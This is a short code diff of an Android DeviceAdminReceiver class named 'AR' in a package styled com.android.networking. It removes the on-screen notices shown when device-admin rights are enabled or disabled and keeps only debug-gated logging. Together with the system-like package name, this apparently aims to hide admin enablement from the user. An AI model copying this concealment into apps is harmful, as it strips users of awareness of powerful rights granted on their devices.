@@ -1,11 +1,15 @@
 package com.android.networking.listener;
 
+import com.android.networking.auto.Cfg;
+import com.android.networking.util.Check;
+
 import android.app.admin.DeviceAdminReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.util.Log;
 import android.widget.Toast;
 
+// http://marakana.com/s/post/1291/android_device_policy_administration_tutorial
 public class AR extends android.app.admin.DeviceAdminReceiver {
 	static final String TAG = "DemoDeviceAdminReceiver";
 
@@ -13,34 +17,42 @@ public class AR extends android.app.admin.DeviceAdminReceiver {
 	@Override
 	public void onEnabled(Context context, Intent intent) {
 		super.onEnabled(context, intent);
-		Toast.makeText(context, R.string.device_admin_enabled, Toast.LENGTH_LONG).show();
-		Log.d(TAG, "onEnabled");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onEnabled) ");
+		}
 	}
 
 	/** Called when this application is no longer the device administrator. */
 	@Override
 	public void onDisabled(Context context, Intent intent) {
 		super.onDisabled(context, intent);
-		Toast.makeText(context, R.string.device_admin_disabled, Toast.LENGTH_LONG).show();
-		Log.d(TAG, "onDisabled");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onDisabled) ");
+		}
 	}
 
 	@Override
 	public void onPasswordChanged(Context context, Intent intent) {
 		super.onPasswordChanged(context, intent);
-		Log.d(TAG, "onPasswordChanged");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onPasswordChanged) ");
+		}
 	}
 
 	@Override
 	public void onPasswordFailed(Context context, Intent intent) {
 		super.onPasswordFailed(context, intent);
-		Log.d(TAG, "onPasswordFailed");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onPasswordFailed) ");
+		}
 	}
 
 	@Override
 	public void onPasswordSucceeded(Context context, Intent intent) {
 		super.onPasswordSucceeded(context, intent);
-		Log.d(TAG, "onPasswordSucceeded");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onPasswordSucceeded) ");
+		}
 	}
 
 }
